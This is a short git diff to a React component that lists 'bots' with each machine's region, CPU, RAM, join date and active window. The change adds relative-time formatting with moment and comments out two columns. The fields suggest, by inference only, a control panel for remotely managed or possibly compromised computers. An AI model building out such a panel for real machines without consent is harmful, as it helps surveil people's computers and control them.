@@ -1,6 +1,7 @@
 import React, { useState } from "react";
 import { BotItem } from "./types";
 import "./BotListItem.css";
+import moment from "moment";
 // import DOMPurify from "dompurify";
 interface BotListItemProps {
   bot: BotItem;
@@ -10,6 +11,10 @@ interface BotListItemProps {
     botVersion: number
   ) => void;
 }
+function getTimeAgo(time: moment.MomentInput) {
+  return moment(time).fromNow();
+}
+
 const BotListItem: React.FC<BotListItemProps> = (botProps) => {
   let bot = botProps.bot;
 
@@ -32,9 +37,9 @@ const BotListItem: React.FC<BotListItemProps> = (botProps) => {
       <div className="region">{bot.region}</div>
       <div className="cpu-brand">{bot.cpu_brand}</div>
       <div className="ram">{bot.ram}</div>
-      <div className="join-date">{bot.join_date}</div>
-      <div className="system-boot-time">{bot.system_boot_time}</div>
-      <div className="ping">{bot.ping}</div>
+      <div className="join-date">{getTimeAgo(bot.join_date)}</div>
+      {/* <div className="system-boot-time">{bot.system_boot_time}</div> */}
+      {/* <div className="ping">{bot.ping}</div> */}
       <div className="active-window">{bot.active_window}</div>
       {/* <div className="os-info">{bot.os_info}</div> */}
     </div>
